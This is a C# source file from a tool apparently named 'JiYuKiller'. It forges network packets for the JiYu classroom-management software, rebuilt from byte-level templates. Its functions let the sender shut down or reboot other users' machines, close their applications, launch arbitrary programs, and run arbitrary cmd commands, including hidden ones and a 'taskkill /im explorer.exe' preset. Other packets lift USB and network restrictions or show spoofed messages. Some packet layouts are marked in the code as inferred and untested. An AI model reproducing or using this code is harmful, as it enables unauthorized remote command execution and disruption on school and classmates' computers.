using System;
using System.Net;

namespace JiYuKiller.Core
{
    /// <summary>
    /// 报文构造器。所有模板来自 JyPackets.g.cs（Nuitka 常量逐字节还原）。
    ///
    /// 已验证的字段偏移（对模板逐字节分析得出）：
    ///   DMOC 族（DmocShutdown 等, 582B）:
    ///     @0  "DMOC"  @4 ver/flags  @8 datalen(=582-28=554)  @12 16B 会话ID
    ///     @28 0x00004e20(20000)  @32 目标IP(网络序)  @36/@40 541  @44 512
    ///     @48 0  @52 操作码  @56 15  @60 1  @64 0  @68 文本(UTF-16LE, 无BOM)
    ///   应用启动族（NotepadLaunch/CmdC/CmdK/UnlockNet）:
    ///     @0 16B GUID  @15 20000(与GUID末字节重叠)  @19 目标IP  @23/@27 865
    ///     @31 512  @35 0  @39 15  @43 1  @47 路径(UTF-16LE)
    ///     CmdC/CmdK 尾部 @559 起为 "/c " 或 "/k "，命令文本追加在其后。
    ///
    /// 真机测试关注点：
    ///   - BuildMessage 的结构是推断（原版动态拼装：12B头 + IP + utf-16[去BOM] + 29*00），
    ///     若消息无法到达，优先调整此处的 IP 偏移与填充。
    /// </summary>
    internal static partial class JyPackets
    {
        private static byte[] H(string hex)
        {
            var b = new byte[hex.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return b;
        }

        /// <summary>DMOC 族目标 IP 位于 @32。</summary>
        private const int OffIpDmoc = 32;
        /// <summary>应用启动族目标 IP 位于 @19。</summary>
        private const int OffIpApp = 19;

        private static byte[] Clone(byte[] tpl) { return (byte[])tpl.Clone(); }

        private static void PatchIp(byte[] pkt, int off, IPAddress ip)
        {
            byte[] v4 = ip.GetAddressBytes();   // 网络序, 模板中 c0a803fe = 192.168.3.254
            if (v4.Length != 4)
                throw new ArgumentException("仅支持 IPv4 目标地址");
            Buffer.BlockCopy(v4, 0, pkt, off, 4);
        }

        /// <summary>基本操作（发送到 order_comboBox 选中的功能）。</summary>
        public enum BasicOp
        {
            OpenNotepad = 0,
            Shutdown = 1,
            ForceReboot = 2,
            RebootWithNotice = 3,
            CloseAllApps = 4,
            KillDesktopProcess = 5,
        }

        public static byte[] BuildBasic(BasicOp op, IPAddress target)
        {
            switch (op)
            {
                case BasicOp.OpenNotepad:
                {
                    var pkt = Clone(NotepadLaunch);
                    PatchIp(pkt, OffIpApp, target);
                    return pkt;
                }
                case BasicOp.Shutdown:
                {
                    var pkt = Clone(DmocShutdown);          // 教师将关闭您的计算机
                    PatchIp(pkt, OffIpDmoc, target);
                    return pkt;
                }
                case BasicOp.ForceReboot:
                {
                    var pkt = Clone(DmocForceReboot);       // 黑客将重启您的计算机
                    PatchIp(pkt, OffIpDmoc, target);
                    return pkt;
                }
                case BasicOp.RebootWithNotice:
                {
                    var pkt = Clone(DmocTeacherReboot);     // 教师将重启您的计算机
                    PatchIp(pkt, OffIpDmoc, target);
                    return pkt;
                }
                case BasicOp.CloseAllApps:
                {
                    var pkt = Clone(DmocCloseApps);         // 黑客将关闭您的应用程序
                    PatchIp(pkt, OffIpDmoc, target);
                    return pkt;
                }
                case BasicOp.KillDesktopProcess:
                    return BuildCommand(target, "taskkill /im explorer.exe /f ", hidden: true);
                default:
                    throw new ArgumentOutOfRangeException(nameof(op));
            }
        }

        /// <summary>程序启动族的固定前缀长度（路径 UTF-16 从该偏移开始）。</summary>
        private const int LaunchPrefixLen = 47;

        /// <summary>
        /// 远程启动任意程序（原版"打开记事本"所用的程序启动族模板, 换目标路径即可）。
        ///
        /// 已验证布局（对 NotepadLaunch 逐字节核对, 用 notepad 路径构造的结果与原模板完全一致）:
        ///   [0..46]   固定前缀（含 16B id、目标IP@19、datalen@23/@27）
        ///   [47..]    程序路径(UTF-16LE)
        ///   随后      尾部固定块 784 字节（末尾第 10 字节处有 0x01）
        ///   datalen   写回 @23 与 @27 = 总长 - 28
        /// </summary>
        public static byte[] BuildLaunch(IPAddress target, string exePath)
        {
            byte[] body = System.Text.Encoding.Unicode.GetBytes(exePath);
            // 尾部固定块 = 原模板去掉前缀与 notepad 路径后的部分(784B)
            int tplTailStart = LaunchPrefixLen + 31 * 2;      // "C:\Windows\system32\NOTEPAD.EXE" = 31 字符
            int tailLen = NotepadLaunch.Length - tplTailStart;
            int total = LaunchPrefixLen + body.Length + tailLen;

            var pkt = new byte[total];
            Buffer.BlockCopy(NotepadLaunch, 0, pkt, 0, LaunchPrefixLen);
            Buffer.BlockCopy(NotepadLaunch, tplTailStart, pkt, LaunchPrefixLen + body.Length, tailLen);
            PatchIp(pkt, OffIpApp, target);
            Buffer.BlockCopy(body, 0, pkt, LaunchPrefixLen, body.Length);

            int datalen = total - 28;
            pkt[23] = (byte)datalen; pkt[24] = (byte)(datalen >> 8);
            pkt[25] = (byte)(datalen >> 16); pkt[26] = (byte)(datalen >> 24);
            pkt[27] = (byte)datalen; pkt[28] = (byte)(datalen >> 8);
            pkt[29] = (byte)(datalen >> 16); pkt[30] = (byte)(datalen >> 24);
            return pkt;
        }

        /// <summary>远程启动的常用程序预设（全部走已验证的程序启动模板）。</summary>
        public static readonly string[] LaunchPresets =
        {
            @"C:\Windows\system32\calc.exe",
            @"C:\Windows\system32\mspaint.exe",
            @"C:\Windows\system32\taskmgr.exe",
            @"C:\Windows\system32\cmd.exe",
            @"C:\Windows\system32\notepad.exe",
            @"C:\Windows\system32\control.exe",
        };

        public static readonly string[] LaunchPresetNames =
        {
            "计算器", "画图", "任务管理器", "命令提示符", "记事本", "控制面板",
        };

        /// <summary>
        /// 净化"打开文件/网页"的参数。该参数最终由目标机的 cmd 解释执行,
        /// 不净化的话: 引号可闭合参数注入任意命令、&amp;|&lt;&gt;^ 会拆分/改写命令、
        /// %var% 会被 cmd 展开。处理: % 与控制字符直接拒绝; 引号翻倍;
        /// 其余(含 &amp; | &lt; &gt; ^)交给调用方用引号包裹后即为字面量。
        /// </summary>
        public static string SanitizeStartArgument(string text)
        {
            if (string.IsNullOrWhiteSpace(text))
                throw new FormatException("内容为空");
            text = text.Trim();
            foreach (char c in text)
            {
                if (char.IsControl(c))
                    throw new FormatException("内容包含控制字符");
                if (c == '%')
                    throw new FormatException("内容不能包含 % (会被 cmd 当作变量展开)");
            }
            return text.Replace("\"", "\"\"");
        }

        /// <summary>
        /// 远程打开文件/网页: start "" "参数" (空标题占位, 参数引号包裹),
        /// 参数先经 <see cref="SanitizeStartArgument"/> 净化 —— 引号内的
        /// &amp; | &lt; &gt; ^ 均为字面量, 无法注入额外命令。
        /// </summary>
        public static byte[] BuildStartOpen(IPAddress target, string text)
        {
            string safe = SanitizeStartArgument(text);
            return BuildCommand(target, "start \"\" \"" + safe + "\"", hidden: true);
        }

        /// <summary>
        /// 远程系统命令：cmd.exe 模板尾部（"/c " 或 "/k "）后追加命令文本(UTF-16LE)。
        /// hidden=true 对应原版 "/h " 前缀（cmd /c，执行后退出）。
        /// </summary>
        public static byte[] BuildCommand(IPAddress target, string cmd, bool hidden)
        {
            var tpl = hidden ? CmdC : CmdK;
            var pkt = new byte[tpl.Length];
            Buffer.BlockCopy(tpl, 0, pkt, 0, tpl.Length);
            PatchIp(pkt, OffIpApp, target);
            byte[] arg = System.Text.Encoding.Unicode.GetBytes(cmd);
            var full = new byte[pkt.Length + arg.Length];
            Buffer.BlockCopy(pkt, 0, full, 0, pkt.Length);
            Buffer.BlockCopy(arg, 0, full, pkt.Length, arg.Length);
            return full;
        }

        /// <summary>
        /// 极域弹窗消息。原版动态拼装（常量 pool[168]/[198] 12字节头 + utf-16 去BOM + 29 字节 0 填充）。
        /// 结构为推断, IP 紧跟 12 字节头之后(@12), 待真机验证。
        /// </summary>
        public static byte[] BuildMessage(IPAddress target, string text, int port)
        {
            byte[] header = port == JyVersion.Port4605 ? MsgHeader4605 : MsgHeader4705;
            byte[] body = System.Text.Encoding.Unicode.GetBytes(text);
            var pkt = new byte[header.Length + 4 + body.Length + 29];
            Buffer.BlockCopy(header, 0, pkt, 0, header.Length);
            byte[] v4 = target.GetAddressBytes();
            Buffer.BlockCopy(v4, 0, pkt, header.Length, 4);
            Buffer.BlockCopy(body, 0, pkt, header.Length + 4, body.Length);
            return pkt;
        }

        /// <summary>"一键解除U盘和网络限制"附带的远程解锁包（op=5, 43字节）。</summary>
        public static byte[] BuildUnlock(IPAddress target)
        {
            var pkt = Clone(UnlockNet);
            PatchIp(pkt, OffIpApp, target);
            return pkt;
        }

        // ------------------------------------------------------------------
        // 以下两个模板提取自"翘课3.0"易语言源码 (MIT License, 零羊IT, LICENSE 见 源码/ 目录)。
        // 提取方式: 对 源码/翘课3.0.e 的常量区做 GBK 字符串抽取后逐字节解析。
        // ------------------------------------------------------------------

        /// <summary>
        /// 4705 端口(2021版)的解锁包, 56 字节。翘课3.0 内置模板:
        /// DMOC 头(datalen=0x39e) + 16B 会话 + 20000@28 + 目标IP@32 +
        /// len@36/@40(=datalen-13=913) + 2048@44 + 0@48 + op=5@52。
        /// 与 4605 版(pool[199])的区别: 多了 DMOC 12 字节帧头, 会话 GUID 首字节为 0xdc。
        /// </summary>
        public static readonly byte[] UnlockNet4705 = H(
            "444d4f43000001009e030000dc79fabb169ec04ca009db380f7f34ee204e0000" +
            "c0a803fe9103000091030000000800000000000005000000");

        /// <summary>
        /// 翘课3.0 内置的 op=6 指令包, 177 字节 (datalen=149)。
        /// 作用未完全考证 (疑为锁屏/窗口锁定类指令), 参数:
        /// len@36/@40=136, 0x4000@44, op=6@52, 123@56, 1@64, 10@68, 80/80@88/@92。
        /// 未在真机验证前请当作实验功能。
        /// </summary>
        public static readonly byte[] Op6Command = H(
            "444d4f4300000100950000002bff8b8a603ee249b82bd4bb4c4d1dae204e0000" +
            "c0a803fe88000000880000000040000000000000060000007b00000000000000" +
            "010000000a000000000000000000000000000000500000005000000000000000" +
            "0000000000000000000000000000000000000000000000000000000000000000" +
            "0000000000000000000000000000000000000000000000000000000000000000" +
            "0000010000000200000002000000000000");

        /// <summary>按极域版本选择解锁包: 2021(4705) 用翘课模板, 其余用原 43 字节模板。</summary>
        public static byte[] BuildUnlockForPort(IPAddress target, int port)
        {
            if (port == JyVersion.Port4705)
            {
                var pkt = Clone(UnlockNet4705);
                PatchIp(pkt, OffIpDmoc, target);
                return pkt;
            }
            return BuildUnlock(target);
        }

        /// <summary>发送翘课3.0 的 op=6 指令包（实验功能, 作用待真机验证）。</summary>
        public static byte[] BuildOp6(IPAddress target)
        {
            var pkt = Clone(Op6Command);
            PatchIp(pkt, OffIpDmoc, target);
            return pkt;
        }

        /// <summary>
        /// 隐藏窗口的远程命令（原版 /h 前缀语义）。与可见命令(CmdC=/c, CmdK=/k)不同:
        /// 该构造不会在目标机上弹出命令窗口, 因此 "关闭所有极域连接" 必须走这条路径。
        ///
        /// 结构（由常量 pool[168]/[198] 推断, 与 BuildMessage 同族）:
        ///   [0..11]  DMOC 版本头(端口相关, datalen@8)
        ///   [12..15] 目标IP
        ///   [16..]   命令文本(UTF-16LE, 不带 /h)
        ///   其余补零至 datalen+28 (原版为定长包)
        /// 真机若无效, 优先调整 IP 偏移(12) 与补零长度。
        /// </summary>
        public static byte[] BuildHiddenCommand(IPAddress target, string cmd, int port)
        {
            if (cmd != null && cmd.StartsWith("/h ", StringComparison.Ordinal))
                cmd = cmd.Substring(3);

            byte[] header = port == JyVersion.Port4705 ? MsgHeader4705 : MsgHeader4605;
            int datalen = BitConverter.ToInt32(header, 8);
            if (datalen <= 0 || datalen > 8192)
                datalen = 878;                      // 4605 默认值(pool[168] = 0x36e)
            int total = datalen + 28;

            byte[] body = System.Text.Encoding.Unicode.GetBytes(cmd ?? string.Empty);
            int needed = 16 + body.Length;
            var pkt = new byte[Math.Max(total, needed)];
            Buffer.BlockCopy(header, 0, pkt, 0, 12);
            byte[] v4 = target.GetAddressBytes();
            Buffer.BlockCopy(v4, 0, pkt, 12, 4);
            Buffer.BlockCopy(body, 0, pkt, 16, body.Length);
            return pkt;
        }
    }
}
